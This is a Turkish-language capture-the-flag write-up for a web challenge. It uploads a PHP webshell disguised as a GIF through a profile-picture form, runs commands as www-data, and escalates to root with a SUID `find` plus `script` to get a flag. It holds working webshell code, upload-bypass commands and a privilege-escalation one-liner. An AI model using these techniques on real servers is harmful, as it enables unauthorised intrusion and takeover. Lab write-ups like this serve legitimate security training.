# 🎯 Profil Resmi3 - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-TTY Privesc-purple?style=for-the-badge" alt="File Upload">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Web  
**Seviye:** Orta  
**Puan:** 500

**Challenge URL:** http://68.183.213.255:9012

**Challenge Açıklaması:** "Agresif araçlar yasak."

---

## 🔍 Analiz

**Hedef:** Web uygulamasındaki dosya yükleme fonksiyonundaki kontrolleri bypass ederek PHP webshell yüklemek, ardından `script` komutu ile TTY simüle edip SUID `find` üzerinden `/root/get_flag` çalıştırmak

**Strateji:** Reconnaissance → GIF magic bytes ile file upload bypass → RCE → TTY simülasyonu + SUID find → Flag

**İpuçları:**
- 🎯 Profil resmi yükleme sistemi → File upload vulnerability
- 🔍 İzin verilen formatlar: PNG, JPG, JPEG, GIF (Max: 5MB)
- 💡 Apache + PHP → GIF magic bytes ile MIME type bypass mümkün
- 🚨 Agresif araçlar yasak → Manuel exploit gerekli
- 🔑 500 puan → Zor seviye challenge, `/root/get_flag` interactive shell gerektiriyor

---

## ✅ Çözüm Adımları

### 🔎 **Adım 1: Web Uygulamasını Keşfet**

İlk olarak hedef URL'i ziyaret edelim ve yapısını inceleyelim.

```bash
curl -v http://68.183.213.255:9012/
```

**Çıktı:**
```http
HTTP/1.1 200 OK
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Set-Cookie: PHPSESSID=94ad74af1379401e624e03f9dfab77d2; path=/
Content-Type: text/html; charset=UTF-8
```

**Analiz:**
- ✅ Apache 2.4.54 + PHP 7.4.33
- 💡 "Version 2.0 - Enhanced Security" yazıyor → öncekinden daha sıkı
- 🎯 POST method ile multipart/form-data, `upload.php` hedef
- 🔑 Session cookie alındı: `PHPSESSID=94ad74af1379401e624e03f9dfab77d2`

**HTML İçeriği:**
```html
<div class="info">
    <strong>👋 Hoşgeldin:</strong> user_3513<br>
    <strong>📝 İzin verilen formatlar:</strong> PNG, JPG, JPEG, GIF<br>
    <strong>📏 Maksimum boyut:</strong> 5MB<br>
    <strong>🔒 Güvenlik:</strong> son challange!
</div>
<form action="upload.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="profile_pic" accept="image/*" required>
    <button type="submit">Yükle ve Kaydet</button>
</form>
```

---

### 📤 **Adım 2: GIF Magic Bytes + PHP Webshell Yükle**

GIF formatı desteklendiği için magic bytes (`GIF89a`) ile PHP kodunu birleştirip `.php.gif` uzantısıyla yükleyelim.

```bash
# GIF magic bytes + PHP webshell oluştur
echo -e 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php.gif

# MIME type image/gif olarak yükle
curl -v -X POST http://68.183.213.255:9012/upload.php \
  -F "profile_pic=@shell.php.gif;type=image/gif" \
  -b "PHPSESSID=94ad74af1379401e624e03f9dfab77d2"
```

**Response:**
```http
HTTP/1.1 302 Found
Location: index.php?success=1
```

**KRİTİK BULGULAR:**
- ✅ Dosya başarıyla yüklendi! (302 redirect → success)
- 💡 Sunucu GIF magic bytes'ı geçerli resim olarak kabul etti

---

### 📂 **Adım 3: Yüklenen Dosyanın Konumunu Bul**

Ana sayfaya dönerek yüklenen dosyanın yolunu bulalım.

```bash
curl -sL "http://68.183.213.255:9012/index.php?success=1" \
  -b "PHPSESSID=94ad74af1379401e624e03f9dfab77d2" | grep -i "upload\|src\|gif\|shell"
```

**Response (ilgili kısım):**
```html
<img src="uploads/user_3513/shell.php.gif" class="profile-pic"
          onclick="window.open(this.src, '_blank')"
```

**ANALİZ:**
- ✅ Dosya yolu bulundu: `uploads/user_3513/shell.php.gif`
- 💡 Kullanıcı bazlı klasör yapısı: `uploads/{username}/`

---

### 🚀 **Adım 4: Shell'i Çalıştır - RCE Doğrula**

```bash
curl -s "http://68.183.213.255:9012/uploads/user_3513/shell.php.gif?cmd=id" \
  -b "PHPSESSID=94ad74af1379401e624e03f9dfab77d2"
```

**Response:**
```
GIF89a
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**ANALİZ:**
- ✅ **RCE ELDE EDİLDİ!** 🎉
- 🎯 `www-data` kullanıcısı olarak komut çalıştırabiliyoruz

---

### 🗺️ **Adım 5: Flag Dosyalarını Bul**

```bash
curl -s "http://68.183.213.255:9012/uploads/user_3513/shell.php.gif?cmd=find+/+-name+'flag*'+2>/dev/null" \
  -b "PHPSESSID=94ad74af1379401e624e03f9dfab77d2"
```

**Response (ilgili kısım):**
```
/var/www/html/flag.txt
/tmp/flag_output
```

**ANALİZ:**
- 💡 İki ilginç dosya bulundu
- 🎯 `/tmp/flag_output` → daha önce çalıştırılmış bir script çıktısı

---

### 🎭 **Adım 6: Fake Flag ve İpuçlarını Oku**

```bash
curl -s "http://68.183.213.255:9012/uploads/user_3513/shell.php.gif?cmd=cat+/var/www/html/flag.txt" \
  -b "PHPSESSID=94ad74af1379401e624e03f9dfab77d2"
```

**Response:**
```
GIF89a
Bu fake flag! Gerçek flag için /root/get_flag çalıştır (root olarak!)
```

```bash
curl -s "http://68.183.213.255:9012/uploads/user_3513/shell.php.gif?cmd=cat+/tmp/flag_output" \
  -b "PHPSESSID=94ad74af1379401e624e03f9dfab77d2"
```

**Response:**
```
GIF89a
Script started on 2026-03-03 09:06:54+00:00 [<not executed on terminal>]
⛔ Root erişimi gerekli!
💡 İpucu: SUID binary kullanın (find)
Script done on 2026-03-03 09:06:54+00:00 [COMMAND_EXIT_CODE="1"]
```

**ANALİZ:**
- ❌ `/root/get_flag` → root yetkisi gerekli
- 💡 İpucu: **SUID find** kullan
- 🎯 `/tmp/flag_output` → `get_flag` daha önce denenmiş, **interactive shell** gerektiğini gösteriyor

---

### 🔑 **Adım 7: SUID find ile Direkt Deneme**

```bash
curl -s "http://68.183.213.255:9012/uploads/user_3513/shell.php.gif?cmd=/usr/bin/find+/+-maxdepth+0+-exec+/root/get_flag+\;" \
  -b "PHPSESSID=94ad74af1379401e624e03f9dfab77d2"
```

**Response:**
```
GIF89a
⛔ Interactive shell gerekli!
💡 İpucu: Reverse shell + 'script /dev/null -c bash'
```

**ANALİZ:**
- ❌ `get_flag` binary'si TTY (terminal) kontrolü yapıyor
- 💡 `script` komutu ile sahte TTY simüle etmek gerekiyor
- 🎯 Reverse shell kurmak yerine `script -q -c` ile iç içe çalıştırma deneyelim

---

### 💥 **Adım 8: script + SUID find ile TTY Simülasyonu → Flag**

`script` komutu ile TTY simüle edip, içinde SUID `find` üzerinden `get_flag` çalıştıralım.

```bash
curl -s "http://68.183.213.255:9012/uploads/user_3513/shell.php.gif?cmd=/usr/bin/find+/+-maxdepth+0+-exec+script+-q+-c+'/usr/bin/find+/+-maxdepth+0+-exec+/root/get_flag+\;'+/dev/null+\;" \
  -b "PHPSESSID=94ad74af1379401e624e03f9dfab77d2"
```

**Response:**
```
GIF89a
🎉 Tebrikler! Privilege Escalation tamamlandı!
🚩 Flag: PITO{shellAlmadancozuldumuversiyon5453132}
```

**ANALİZ:**
- ✅ **FLAG BULUNDU!** 🎉🎉🎉
- 💡 `script -q -c` ile TTY simüle edildi → `get_flag` binary'si terminal kontrolünü geçti
- 🎯 Dış `find` SUID ile root yetkisi sağladı, iç `find` de aynı yetkiyle `get_flag` çalıştırdı
- 🚩 **Flag:** `PITO{shellAlmadancozuldumuversiyon5453132}`

---

## 🚩 **FLAG**
```
PITO{shellAlmadancozuldumuversiyon5453132}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🌐<br><b>curl</b><br><sub>HTTP requests</sub></td>
<td align="center">📁<br><b>echo</b><br><sub>Magic bytes injection</sub></td>
<td align="center">🐚<br><b>script</b><br><sub>TTY simülasyonu</sub></td>
<td align="center">🔧<br><b>find</b><br><sub>SUID privesc</sub></td>
</tr>
</table>

---

## 💭 **Çözüm Akış Şeması**

```
🎯 Profil Resmi3 Challenge
       ↓
🌐 Web uygulamasını keşfet
   → Apache 2.4.54 + PHP 7.4.33
   → "Version 2.0 - Enhanced Security"
   → Profil resmi yükleme formu
   → İzin verilen: PNG, JPG, JPEG, GIF
   → Session: PHPSESSID alındı
       ↓
📤 GIF magic bytes + PHP webshell
   → GIF89a header + <?php system() ?>
   → shell.php.gif yüklendi (MIME: image/gif)
   → 302 redirect → success! ✅
   → Dosya yolu: uploads/user_3513/shell.php.gif
       ↓
🚀 Shell çalıştır
   → shell.php.gif?cmd=id
   → uid=33(www-data) ✅ RCE ELDE EDİLDİ!
       ↓
🗺️ Sistemi keşfet
   → find / -name 'flag*'
   → /var/www/html/flag.txt → FAKE FLAG
   → /tmp/flag_output → interactive shell gerekiyor
   → /root/get_flag → TTY kontrolü var
       ↓
🔑 SUID find ile direkt deneme
   → find -exec /root/get_flag → ⛔ Interactive shell gerekli!
       ↓
💥 script + iç içe SUID find
   → find -exec script -q -c 'find -exec /root/get_flag' /dev/null
   → script TTY simüle etti ✅
   → get_flag root olarak çalıştı ✅
       ↓
✅ FLAG: PITO{shellAlmadancozuldumuversiyon5453132}
```
